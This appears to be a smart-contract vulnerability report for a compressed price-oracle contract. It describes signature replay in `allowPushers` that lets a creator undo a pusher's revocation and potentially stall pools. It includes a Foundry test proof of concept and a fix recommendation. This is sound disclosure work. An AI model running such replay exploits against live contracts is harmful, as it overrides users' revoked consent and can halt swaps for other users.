### Title
Pusher Delegation Signature Replay Allows Creator to Re-Establish Revoked Delegation, Causing Pool Feed Staleness — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` in `CompressedOracleV1` does not track consumed signatures (no nonce). A creator who holds a valid, non-expired EIP-191 consent from a pusher can replay it an unlimited number of times within the deadline window. After a pusher calls `revokePusher()` to clear their delegation, the original creator can immediately re-establish it by replaying the old signature, overwriting `namespaceRemapping[pusher]` back to themselves. The pusher cannot stop this until the deadline expires. If the pusher responds by halting all pushes to avoid feeding the creator's namespace, any pool whose price provider reads from that creator's `CompressedOracleV1` feedId receives no further updates, goes stale, and halts with `FeedStalled`.

### Finding Description

`allowPushers` builds a signature hash over `(block.chainid, address(this), deadline, pusher, msg.sender)` and writes `namespaceRemapping[pusher] = msg.sender` unconditionally on success: [1](#0-0) 

There is no nonce, no used-signature bitmap, and no check that `namespaceRemapping[pusher]` is currently zero or already equals `msg.sender`. The only temporal bound is the `deadline` field embedded in the signed message.

When a pusher calls `revokePusher()`, the mapping is cleared to `address(0)`: [2](#0-1) 

But the original creator still holds the pusher's signed bytes. Because the signature is valid until `deadline`, the creator can call `allowPushers` again with the same `(deadline, pusher, signature)` tuple and overwrite `namespaceRemapping[pusher]` back to themselves. The pusher's revocation is silently undone.

The `fallback` push path resolves the namespace at call time: [3](#0-2) 

So every subsequent push from the pusher lands in the creator's namespace again, not the pusher's own namespace or a new creator's namespace.

The code comment acknowledges the deadline is the sole protection against post-revocation replay: [4](#0-3) 

But the deadline only bounds the outer window; it does not prevent the creator from replaying the same signature repeatedly within that window after the pusher has revoked.

### Impact Explanation

A pool whose price provider reads from a `CompressedOracleV1` feedId depends on the pusher keeping that slot updated. If the pusher revokes and the creator replays the signature to re-establish delegation, the pusher faces two choices:

1. Continue pushing — updates land in the creator's namespace (the creator retains feed control the pusher intended to withdraw).
2. Stop pushing entirely — the creator's feeds go stale; `AnchoredPriceProvider._readLeg` returns `ok = false` on staleness: [5](#0-4) 

`getBidAndAskPrice` then reverts with `FeedStalled`: [6](#0-5) 

Every swap on the pool fails until the deadline expires and the pusher can permanently revoke. This is an unusable swap flow within the Allowed Impact Gate.

### Likelihood Explanation

- The creator is any permissionless address that previously obtained a pusher's consent signature.
- Pushers commonly sign with multi-day or multi-week deadlines for operational convenience.
- The creator needs only to call `allowPushers` once per block (or less) to keep the mapping overwritten; gas cost is negligible.
- The pusher has no on-chain mechanism to invalidate the old signature before the deadline.

### Recommendation

Track consumed signatures with a per-pusher nonce or a `usedSignatures` mapping. Before writing `namespaceRemapping[pusher] = msg.sender`, verify that the exact `(pusher, deadline, signature)` tuple has not been used before, and mark it consumed. Alternatively, include a monotonically increasing nonce in the signed payload so that a revoked pusher can increment their nonce off-chain, invalidating all prior signatures regardless of deadline.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from
    "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {IOffchainOracle} from
    "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";

contract SignatureReplayPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creatorA;
    address creatorB;

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher   = vm.addr(PUSHER_KEY);
        creatorA = address(0xAAAA);
        creatorB = address(0xBBBB);
        vm.warp(1_700_000_000);
    }

    function testReplayAfterRevoke() public {
        // 1. Pusher signs consent for creatorA with a 7-day deadline.
        uint256 deadline = block.timestamp + 7 days;
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creatorA))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. CreatorA establishes delegation.
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorA);

        // 3. Pusher revokes — intends to push into own namespace.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. CreatorA replays the SAME signature — no nonce, no used-sig check.
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);

        // 5. Delegation is silently re-established without pusher's current consent.
        assertEq(
            oracle.namespaceRemapping(pusher),
            creatorA,
            "delegation re-established via replay — pusher's revocation undone"
        );

        // 6. Pusher's next push lands in creatorA's namespace, not their own.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw  = (uint48(500_000) << 16) | (uint48(3) << 8) | uint48(3);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId = 0
        word |= uint256(raw) << 208;

        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Push landed in creatorA's namespace — pusher cannot redirect it.
        IOffchainOracle.OracleData memory dataA =
            oracle.getOracleData(oracle.feedIdOf(creatorA, 0, 0));
        assertGt(dataA.price, 0, "creatorA namespace updated despite revocation");

        IOffchainOracle.OracleData memory dataPusher =
            oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0));
        assertEq(dataPusher.price, 0, "pusher's own namespace stays empty");
    }
}
```

The test demonstrates that after `revokePusher()`, the creator replays the original signature and the pusher's subsequent push lands in the creator's namespace. Any pool whose `AnchoredPriceProvider` reads from the creator's feedId continues to receive updates the pusher did not intend to provide; if the pusher stops pushing entirely to escape, the feed goes stale and the pool halts.

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
